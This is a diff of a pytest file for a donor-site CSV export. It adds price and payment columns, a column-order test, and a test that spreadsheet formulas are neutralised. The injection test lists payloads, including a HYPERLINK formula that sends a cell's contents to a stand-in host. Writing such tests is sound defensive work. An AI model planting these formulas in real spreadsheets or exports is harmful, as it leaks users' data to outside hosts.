@@ -22,7 +22,8 @@ from backend.features.core.models.access import UserModel
 from backend.features.core.models.domain import DomainModel
 from backend.features.core.models.donor import ContactModel, DonorModel
 from backend.features.donors import export
-from backend.features.donors.browse import DonorBrowser, DonorFilters
+from backend.features.donors.browse import DonorBrowser
+from backend.features.donors.table_filters import DonorFilters
 from backend.features.donors.wording import CONTACT_STATUS_TITLES, DONOR_STATUS_TITLES
 from httpx import AsyncClient
 from sqlalchemy.ext.asyncio import AsyncSession
@@ -32,6 +33,7 @@ MakeUser = Callable[..., Awaitable[UserModel]]
 SignIn = Callable[..., Awaitable[str]]
 
 CHECKED = datetime(2026, 9, 18, 10, 0, tzinfo=UTC)
+PRICED = datetime(2026, 10, 2, 8, 30, tzinfo=UTC)
 
 
 @pytest.fixture
@@ -57,6 +59,12 @@ async def donor(session: AsyncSession) -> DonorModel:
         contact_status=ContactStatus.FOUND,
         last_price=Decimal("50.00"),
         last_price_currency="EUR",
+        last_price_at=PRICED,
+        last_price_white=Decimal("50.00"),
+        last_price_grey=Decimal("70.00"),
+        last_payment_methods=["PayPal", "Wise"],
+        last_placement_days=3,
+        last_link_type="dofollow",
         metrics_refreshed_at=CHECKED,
         # Выгружаются доноры — принятые человеком (решение 26.09.2026).
         review="accepted",
@@ -97,6 +105,14 @@ async def test_every_column_carries_the_value(
             "цена": "50.00",
             "валюта": "EUR",
             "метрики от": "2026-09-18",
+            "решение": "принят",
+            "белая цена": "50.00",
+            "серая цена": "70.00",
+            "цена от": "2026-10-02",
+            "цена свежая до": "2027-03-01",
+            "оплата": "PayPal, Wise",
+            "срок, дней": "3",
+            "ссылка": "dofollow",
         }
     ]
 
@@ -164,3 +180,50 @@ async def test_codes_leave_the_file_as_words(
     assert row["доля региона"] == "20%"
     assert row["исход поиска"] == "не искали"
     assert row["причина отсева"] == "Нигерия не входит в топ-5 и даёт меньше 20%"
+
+
+def test_new_columns_go_after_the_old_ones() -> None:
+    """Решение, вся цена и её срок (12.10.2026) — в конце: таблицы, что читают файл
+    по номерам колонок, прежние колонки находят на прежних местах."""
+    header = export.to_csv([]).decode("utf-8-sig").splitlines()[0].split(";")
+
+    assert header[:12] == [
+        "домен",
+        "вердикт",
+        "причина отсева",
+        "DR",
+        "трафик",
+        "регион",
+        "доля региона",
+        "адресов",
+        "исход поиска",
+        "цена",
+        "валюта",
+        "метрики от",
+    ]
+
+
+@pytest.mark.parametrize(
+    "evil",
+    [
+        '=HYPERLINK("https://x.example.test/?"&A2,"pay")',
+        "+1+1",
+        "-1+1",
+        "@SUM(1)",
+        "\tPayPal",
+        "\nWise",
+    ],
+)
+async def test_a_formula_from_a_letter_stays_text(
+    client: AsyncClient, token: str, session: AsyncSession, donor: DonorModel, evil: str
+) -> None:
+    """Оплата и валюта — слова из письма донора или вписанные человеком: формула в них
+    при открытии файла в Excel или Google Sheets исполнилась бы (OWASP)."""
+    donor.last_payment_methods = [evil]
+    donor.last_price_currency = evil[:8]  # колонка валюты — восемь знаков
+    await session.commit()
+
+    (row,) = _rows((await client.get("/api/donors/export", headers=bearer(token))).content)
+
+    assert (row["оплата"], row["валюта"]) == (f"'{evil}", f"'{evil[:8]}")
+    assert row["домен"] == "weak.example.test"  # обычные ячейки не тронуты
